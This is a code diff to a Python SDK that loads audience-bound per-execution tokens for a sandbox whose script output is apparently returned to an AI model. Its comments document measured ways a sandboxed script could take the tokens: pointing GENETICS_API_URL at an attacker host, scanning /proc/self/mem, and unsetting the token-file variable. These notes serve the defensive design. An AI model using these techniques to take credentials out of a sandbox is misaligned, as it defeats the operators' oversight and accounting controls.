@@ -4,6 +4,7 @@ import asyncio
 import base64
 import inspect
 import io
+import json
 import logging
 import mimetypes
 import os
@@ -114,6 +115,256 @@ def _endpoint_env(name: str, default: str | None = None) -> str | None:
     """
     _resolve_settings()
     return os.environ.get(name, default)
+
+
+# --------------------------------------------------------------------------------------
+# The per-execution sandbox credential (genetics-results-suite-4h6.44)
+# --------------------------------------------------------------------------------------
+
+# The supervisor writes /scratch/<execution_id>/tokens.json before it forks and names the
+# PATH — never the tokens — to the child under this variable (genetics-results-suite
+# sandbox/supervisor.py, ENV_TOKEN_FILE / TOKEN_FILE_NAME). The file is a JSON object
+# keyed by audience: {"db-api": "<jws>", "results-api": "<jws>"}.
+SANDBOX_TOKEN_FILE_ENV = "SANDBOX_TOKEN_FILE"
+DB_API_AUDIENCE = "db-api"
+RESULTS_API_AUDIENCE = "results-api"
+SANDBOX_TOKEN_AUDIENCES = (DB_API_AUDIENCE, RESULTS_API_AUDIENCE)
+
+# a token pair is a few hundred bytes; anything near this is not the supervisor's file
+_SANDBOX_TOKEN_FILE_MAX_BYTES = 64 * 1024
+
+_sandbox_tokens_lock = threading.Lock()
+_sandbox_tokens: dict[str, str] | None = None
+_sandbox_tokens_error: Exception | None = None
+_sandbox_tokens_loaded = False
+
+
+class SandboxCredentialError(RuntimeError):
+    """The SDK could not obtain the per-execution token pair it was supposed to have.
+
+    Either SANDBOX_TOKEN_FILE named a file that did not yield a usable pair, or a pruned
+    install — the sandbox image, and only ever that — reached client construction with no
+    token file and no INTERNAL_API_SECRET.
+    """
+
+
+def _reset_sandbox_tokens() -> None:
+    """Test seam. The read is once-per-process by design; tests need to repeat it."""
+    global _sandbox_tokens, _sandbox_tokens_error, _sandbox_tokens_loaded
+    with _sandbox_tokens_lock:
+        _sandbox_tokens = None
+        _sandbox_tokens_error = None
+        _sandbox_tokens_loaded = False
+
+
+def _read_and_unlink(path: str) -> bytes:
+    """Read the whole file once, then unlink it whether or not the read succeeded.
+
+    O_NOFOLLOW for the same reason the supervisor writes with it: /scratch is writable by
+    everything running under the shared uid, so a symlink planted at the path would
+    otherwise redirect this read. The unlink is in a `finally` because a file left behind
+    after a *failed read* is the worst of both outcomes.
+
+    That `finally` covers reads, not opens: a path that cannot be OPENED at all — a
+    symlink (ELOOP, by design) or a mode-000 file (EACCES) — raises before the `try` and
+    is therefore left on disk. Nil impact in the pod, where the supervisor writes the file
+    itself with O_EXCL|O_NOFOLLOW 0600 and reaps the whole /scratch/<execution_id>
+    directory afterwards; the case exists only when something else has already put a file
+    the SDK did not write at that path, which is not a state this function can improve.
+    """
+    fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)
+    try:
+        chunks: list[bytes] = []
+        size = 0
+        while size <= _SANDBOX_TOKEN_FILE_MAX_BYTES:
+            chunk = os.read(fd, 65536)
+            if not chunk:
+                break
+            chunks.append(chunk)
+            size += len(chunk)
+        if size > _SANDBOX_TOKEN_FILE_MAX_BYTES:
+            raise SandboxCredentialError(
+                f"{path} is larger than {_SANDBOX_TOKEN_FILE_MAX_BYTES} bytes; "
+                "that is not the supervisor's token file"
+            )
+        return b"".join(chunks)
+    finally:
+        try:
+            os.close(fd)
+        finally:
+            try:
+                os.unlink(path)
+            except OSError as exc:
+                # the credential outliving this call is worth a line even though the
+                # execution can continue
+                logger.warning("could not unlink %s: %s", path, exc)
+
+
+def _load_sandbox_tokens() -> dict[str, str] | None:
+    """The per-execution tokens, read ONCE and unlinked, or None outside the sandbox.
+
+    READ-ONCE-AND-UNLINK IS NOT AN EXPOSURE BOUND and must not be described as one. The
+    child is forked without exec from a supervisor that holds the tokens in its address
+    space, and a raw /proc/self/mem scan in the child was measured to recover them —
+    including from an execution that had already completed; a detached grandchild of an
+    earlier execution was measured reading a live token file inside this very window.
+    What bounds the exposure is genetics-results-suite-4h6.55 and nothing here.
+
+    NEITHER IS ANY OF THIS A CONTROL OVER THE SCRIPT. The child is forked without exec and
+    owns its own os.environ, so both behaviours below are conditioned on inputs the script
+    can rewrite before the SDK's first use, and both were measured being rewritten:
+
+    * Unlinking is the half of the delivery contract this side owns, and it happens only on
+      the branch where SANDBOX_TOKEN_FILE is set. `os.environ.pop("SANDBOX_TOKEN_FILE")`
+      before the first SDK call leaves the file on disk for the whole execution, removed
+      only by the supervisor's reap. That widens a window this function would otherwise
+      have closed in microseconds — but the same script could read the file itself, so it
+      is hygiene against accident and misconfiguration, not containment.
+    * Raising rather than degrading to no credential: SANDBOX_TOKEN_FILE being set is the
+      sandbox saying it minted tokens, so failing to use them is a misconfiguration whose
+      only other symptom is a bare 401 from a service that names no cause. Unsetting it
+      instead takes the None branch, which is why `_build_client` refuses to build an
+      uncredentialed client in a pruned install: the sandbox image is the one install where
+      "no token and no secret" can never be legitimate. Note what the child still controls —
+      the warning that accompanies any of this goes to this process's logger, i.e. into the
+      execution's OWN captured stdout, which is returned to the model rather than to the
+      pod log.
+    """
+    global _sandbox_tokens, _sandbox_tokens_error, _sandbox_tokens_loaded
+    if _sandbox_tokens_loaded:
+        if _sandbox_tokens_error is not None:
+            raise _sandbox_tokens_error
+        return _sandbox_tokens
+    with _sandbox_tokens_lock:
+        if _sandbox_tokens_loaded:
+            if _sandbox_tokens_error is not None:
+                raise _sandbox_tokens_error
+            return _sandbox_tokens
+        path = os.environ.get(SANDBOX_TOKEN_FILE_ENV, "").strip()
+        tokens: dict[str, str] | None = None
+        error: Exception | None = None
+        if path:
+            try:
+                tokens = _parse_sandbox_tokens(_read_and_unlink(path), path)
+            except SandboxCredentialError as exc:
+                error = exc
+            except OSError as exc:
+                error = SandboxCredentialError(
+                    f"{SANDBOX_TOKEN_FILE_ENV}={path} could not be read: {exc}"
+                )
+        _sandbox_tokens = tokens
+        _sandbox_tokens_error = error
+        _sandbox_tokens_loaded = True
+    if error is not None:
+        raise error
+    return tokens
+
+
+def _parse_sandbox_tokens(raw: bytes, path: str) -> dict[str, str]:
+    try:
+        body = json.loads(raw.decode("utf-8"))
+    except (UnicodeDecodeError, ValueError) as exc:
+        raise SandboxCredentialError(f"{path} is not decodable JSON: {exc}") from None
+    if not isinstance(body, dict):
+        raise SandboxCredentialError(f"{path} is not a JSON object")
+    tokens = {}
+    for audience in SANDBOX_TOKEN_AUDIENCES:
+        token = body.get(audience)
+        if not isinstance(token, str) or not token:
+            raise SandboxCredentialError(
+                f"{path} carries no usable {audience!r} token; the pair is audience-bound "
+                "and a cross-audience token is a hard 401 at both validators"
+            )
+        tokens[audience] = token
+    return tokens
+
+
+def _origin(url: httpx.URL) -> tuple[str, str, int | None]:
+    return (url.scheme, url.host, url.port)
+
+
+def _origin_display(url: httpx.URL) -> str:
+    """scheme://host[:port], rebuilt from the parts rather than by blanking the URL.
+
+    `url.copy_with(query=None, fragment=None, raw_path=b"/")` looks equivalent and is not:
+    it RETAINS userinfo, so a caller-supplied password lands on a log line
+    (http://user:hunter2@evil.test/collect -> "http://user:hunter2@evil.test/"). Not a
+    sandbox credential, but not ours to log either.
+    """
+    scheme, host, port = _origin(url)
+    if ":" in host:  # IPv6 literal; URL.host returns it unbracketed
+        host = f"[{host}]"
+    return f"{scheme}://{host}" if port is None else f"{scheme}://{host}:{port}"
+
+
+class _SandboxTokenAuth(httpx.Auth):
+    """Attaches the per-execution token BOUND TO THE DESTINATION of each request.
+
+    One httpx client serves both upstreams, and the two tokens are not interchangeable:
+    `aud` is validated exactly at genetics-results-db `api/sandbox_auth.py` and
+    genetics-results-api `app/core/sandbox_token.py`, both of which additionally refuse a
+    list-valued `aud`, so a token sent to the wrong service is a hard 401 rather than a
+    degraded success. A default header on the client cannot express that, which is why
+    this is per-request.
+
+    A request to any other destination gets NO credential. That is hygiene against an
+    accidental or misconfigured base URL, NOT a control over the script: the child is
+    forked without exec and owns os.environ, while `base_url` and `bigquery_url` are
+    cached_property reads of GENETICS_API_URL / BIGQUERY_API_URL resolved on FIRST USE and
+    `sdk/__init__.py` holds `_client = None` until the first call — so a script that sets
+    GENETICS_API_URL=http://evil.attacker.test/api before its first SDK call makes that
+    host the matching destination and is handed the results-api token, as measured. The
+    same script can read the token out of /proc/self/mem regardless
+    (genetics-results-suite-4h6.55), so nothing here can be hardened into containment;
+    what stops the request is the sandbox's deny-by-default egress allow-list.
+    """
+
+    def __init__(self, tokens: dict[str, str], destinations: list[tuple[str, str]]):
+        self._tokens = tokens
+        # longest path prefix first so two upstreams sharing an origin still resolve
+        self._destinations = sorted(
+            ((httpx.URL(base), audience) for base, audience in destinations),
+            key=lambda item: len(str(item[0].path).rstrip("/")),
+            reverse=True,
+        )
+        self._warned: set[str] = set()
+
+    def audience_for(self, url: httpx.URL) -> str | None:
+        """The audience whose base URL this request falls under, or None.
+
+        The prefix match is on whole path SEGMENTS. A bare `startswith` makes `/api/bq` a
+        prefix of `/api/bqx`, so with the two upstreams co-located on one origin —
+        GENETICS_API_URL=http://svc:4000/api, BIGQUERY_API_URL=http://svc:4000/api/bq —
+        a request to /api/bqx/steal would be handed the db-api token, which is the wrong
+        audience, i.e. a token sent somewhere its base URL never said it could go. Not
+        reachable in the dev stack or the cluster, where the two are distinct hosts; the
+        `sorted()` above exists precisely to keep the co-located case working, so the
+        matching rule has to actually support it.
+        """
+        path = str(url.path)
+        for base, audience in self._destinations:
+            if _origin(url) != _origin(base):
+                continue
+            prefix = str(base.path).rstrip("/")
+            if path == prefix or path.startswith(f"{prefix}/"):
+                return audience
+        return None
+
+    def auth_flow(self, request):
+        audience = self.audience_for(request.url)
+        if audience is None:
+            origin = _origin_display(request.url)
+            if origin not in self._warned:
+                self._warned.add(origin)
+                logger.warning(
+                    "no per-execution token matches %s; sending it with no Authorization "
+                    "header. The sandbox token is bound to db-api and results-api only.",
+                    origin,
+                )
+        else:
+            request.headers["Authorization"] = f"Bearer {self._tokens[audience]}"
+        yield request
+
 
 # distinguishes "caller did not ask for a row cap" from "caller asked for no cap at all",
 # since None is a meaningful value for _row_limit
@@ -300,32 +551,74 @@ class ToolExecutor:
             with self._client_lock:
                 client = self.__dict__.get("client")
                 if client is None:
-                    settings = _resolve_settings()
-                    api_secret = settings.internal_api_secret
-                    headers = (
-                        {"Authorization": f"Bearer {api_secret}"} if api_secret else {}
-                    )
-                    if not api_secret and settings is not _PRUNED_INSTALL_SETTINGS:
-                        # NOT raising, and not silent either (genetics-results-suite-618).
-                        # Raising here would break a local run against an unauthenticated
-                        # results-api, which README documents as supported; the deployed
-                        # entrypoints call config.require_internal_api_secret() at startup so a
-                        # pod in this state never reaches this line. What is left is a
-                        # developer's own machine, where a bare 401 from results-api is the only
-                        # other symptom and does not name the cause.
-                        # The pruned install is excluded because credential-less is its DESIGN,
-                        # not a misconfiguration: the sandbox holds no internal secret and gets
-                        # a per-execution token instead (genetics-results-suite-4h6.9 / .14).
-                        logger.warning(
-                            "INTERNAL_API_SECRET is unset; calls to %s and %s will be sent with "
-                            "no Authorization header and will be refused by any deployment that "
-                            "requires authentication",
-                            self.base_url,
-                            self.bigquery_url or "the BigQuery API",
-                        )
-                    client = _ResilientAsyncClient(timeout=300.0, headers=headers)
+                    client = self._build_client()
                     self.__dict__["client"] = client
         return client
+
+    def _build_client(self) -> _ResilientAsyncClient:
+        """One client, credentialled from the per-execution tokens when they exist.
+
+        The sandbox path and the service path are mutually exclusive by design: an
+        execution's token carries the real end user's `sub`, `sid` and `jti`, and those
+        three are what results-api's per-execution counters are keyed on
+        (app/core/sandbox_budget.py). INTERNAL_API_SECRET satisfies `is_internal_caller`
+        and therefore reaches every handler while `_sandbox_principal` resolves nothing, so
+        a sandbox request carrying it is served with NO ACCOUNTING AT ALL — that is
+        genetics-results-suite-0lf, and it is why attaching both, or preferring the secret,
+        would silently re-open it.
+
+        db-api meters differently but on the same key: it has no request counter and no
+        in-flight gate, and `_caps_for` (genetics-results-db api/main.py) grants the
+        *relaxed* row and byte ceilings to the INTERNAL_API_SECRET principal with no `jti`,
+        so the 200 GB `SANDBOX_AGGREGATE_BYTES_BUDGET` charged by `_charge_aggregate` is
+        keyed on the execution id this token carries and is charged for no other caller.
+        `genetics.sql()` is therefore metered by bytes, not by request count.
+        """
+        tokens = _load_sandbox_tokens()
+        if tokens is not None:
+            destinations = [(self.base_url, RESULTS_API_AUDIENCE)]
+            if self.bigquery_url:
+                destinations.append((self.bigquery_url, DB_API_AUDIENCE))
+            return _ResilientAsyncClient(
+                timeout=300.0, auth=_SandboxTokenAuth(tokens, destinations)
+            )
+
+        settings = _resolve_settings()
+        api_secret = settings.internal_api_secret
+        if not api_secret:
+            if settings is _PRUNED_INSTALL_SETTINGS:
+                # The pruned install is the sandbox image and nothing else (see
+                # _PrunedInstallSettings), its `internal_api_secret` is "" by construction,
+                # and the supervisor is the only thing that sets SANDBOX_TOKEN_FILE. So this
+                # combination is never a legitimate state, which makes it the one place the
+                # uncredentialed fallback can be refused outright instead of warned about.
+                # Hygiene, NOT a control: the child owns os.environ and can unset the
+                # variable to reach this line, but it can equally mint its own file — what
+                # this buys is that an accident or a supervisor bug fails loudly here rather
+                # than as a bare 401 from a service that names no cause.
+                raise SandboxCredentialError(
+                    f"{SANDBOX_TOKEN_FILE_ENV} is unset and no internal credential is "
+                    "installed; a pruned (sandbox) install has no other way to authenticate "
+                    "and must not fall back to sending requests unauthenticated"
+                )
+            # NOT raising outside the pruned install, and not silent either
+            # (genetics-results-suite-618). Raising here would break a local run against an
+            # unauthenticated results-api, which README documents as supported; the deployed
+            # entrypoints call config.require_internal_api_secret() at startup so a
+            # pod in this state never reaches this line. What is left is a
+            # developer's own machine, where a bare 401 from results-api is the only
+            # other symptom and does not name the cause.
+            logger.warning(
+                "no credential: %s names no per-execution token file and "
+                "INTERNAL_API_SECRET is unset. Calls to %s and %s will be sent with no "
+                "Authorization header and will be refused by any deployment that requires "
+                "authentication",
+                SANDBOX_TOKEN_FILE_ENV,
+                self.base_url,
+                self.bigquery_url or "the BigQuery API",
+            )
+        headers = {"Authorization": f"Bearer {api_secret}"} if api_secret else {}
+        return _ResilientAsyncClient(timeout=300.0, headers=headers)
 
     @client.setter
     def client(self, value: _ResilientAsyncClient) -> None:
